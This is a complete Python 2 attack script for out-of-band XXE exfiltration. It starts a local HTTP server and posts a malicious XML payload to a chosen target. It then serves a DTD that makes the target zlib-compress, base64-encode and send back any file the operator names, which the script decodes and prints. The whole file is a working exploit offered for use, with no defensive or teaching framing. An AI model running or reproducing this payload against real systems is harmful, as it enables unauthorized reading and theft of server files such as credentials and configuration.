#!/usr/bin/env python  
# Based on the HTTP echo server by Nathan Hamiel
# https://gist.github.com/huyng/814831
# Modified very slightly by Booj to decode filter results

import fcntl, socket, struct, base64, zlib, sys, threading, requests
from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler  
from optparse import OptionParser 
from time import sleep

headers = {  
'User-Agent':'Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0',  
'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',  
'Accept-Language':'en-US,en;q=0.5',  
'Accept-Encoding':'gzip, deflate',  
'Content-type':'application/xml'  
}  
requested_file = None #Global Variable, yes probably it's bad practice to do this, dc 
fetched = False #The script has a tendency to return the same file multiple times, in the effort of cleanliness, restrict it to just once 

def gen_init_payload(ip, port):
    return '''<?xml version="1.0" ?>  
<!DOCTYPE r [  
<!ELEMENT r ANY >  
<!ENTITY % sp SYSTEM "http://{0}:{1}/dtd.xml">  
%sp;  
%param1;  
]>  
<r>&exfil;</r>  
'''.format(ip, port)

def gen_oob_payload(ip, port, file):
    return '''<!ENTITY % data SYSTEM "php://filter/read=zlib.deflate/read=convert.base64-encode/resource={0}">  
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://{1}:{2}/dtd.xml?%data;'>">'''.format(requested_file, ip, port)

class RequestHandler(BaseHTTPRequestHandler): 

    def do_GET(self):  
        global fetched 
        global requested_file 
        request_path = self.path
        ip, port = self.server.server_ip, self.server.server_port
        if requested_file == None:  
            self.send_response(404) 
            self.send_header("Set-Cookie", "foo=bar")  
            self.end_headers() 

        elif '?' in request_path and fetched == True: 
            req = request_path.split("?", 1)[1]  #V hacky but works in this case so whatevs babe will fix later   
            print '--------------------------------------'  
            print zlib.decompress(base64.b64decode(req), -15) #Equivalent to PHP zlib decompress
            sys.stdout.flush() 
            self.send_response(200)  
            self.send_header("Set-Cookie", "foo=bar")  
            fetched = False

        elif 'xml' in request_path and fetched == True: 
            #This has a tendency to send the same file multiple times, set a flag on each to ensure that doesn't happen     
            dtd = gen_oob_payload(ip, port, request_path)
            self.send_response(200)  
            self.send_header("Set-Cookie", "foo=bar")  
            self.send_header("Content-type", "application/xml")  
            self.end_headers() 
            self.wfile.write(dtd) 

    def log_message(self, format, *args):  
        return  

    do_DELETE = do_GET  


def httpserver(ip, port=8000):
    print('Listening on %s:%s' % (ip, port))  
    RequestHandler.server_ip = ip
    server = HTTPServer((ip, port), RequestHandler)
    server.server_ip = ip
    server.serve_forever()  

def get_ip_address(ifname):  
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  
    return socket.inet_ntoa(fcntl.ioctl(s.fileno(),0x8915,struct.pack('256s',ifname[:15]))[20:24])  
                                

if __name__ == "__main__":  
    parser = OptionParser()  
    parser.add_option("-i", "--interface", dest="interface", type="string", help="specify interface to run on") 
    parser.add_option("-H", "--hostname", dest="hostname", type="string", help="specify hostname to run on") 
    parser.add_option("-p", "--port", dest="port", default="8000", type="int", help="specify port") 
    parser.add_option("-t", "--target", dest="target", help="target to send XXE payload to") 
    parser.usage = ("""-i interface to bind http server to 
-H hostname to bind http server to, mutually exclusive with interface
-p port to bind http server to 
-t target to send XXE payload
""") 
    (options, args) = parser.parse_args()    
    if (options.hostname == None and options.interface == None) or options.target == None: 
        parser.error('incorrect arguments usage') 
    elif options.interface and options.hostname: 
        parser.error("options -h and -i are mutually exclusive")
    
    hostname = options.hostname if options.hostname else get_ip_address(options.interface)
    target = options.target
    port = options.port

    #Start the http server in a daemon instance 
    httpthread = threading.Thread(target=httpserver, args=[hostname, port]) 
    httpthread.daemon = True 
    httpthread.start() 
    sleep(3)
    while True: 
        requested_file = raw_input('File: ') 
        fetched = True # Set it here to indicate we've requested a file 
        payload = gen_init_payload(hostname, port)
        i = requests.post(target, payload, headers=headers) #target goes here
#This will write a dtd file requesting a file, then send an XXE injection force the remote server to fetch the dtd
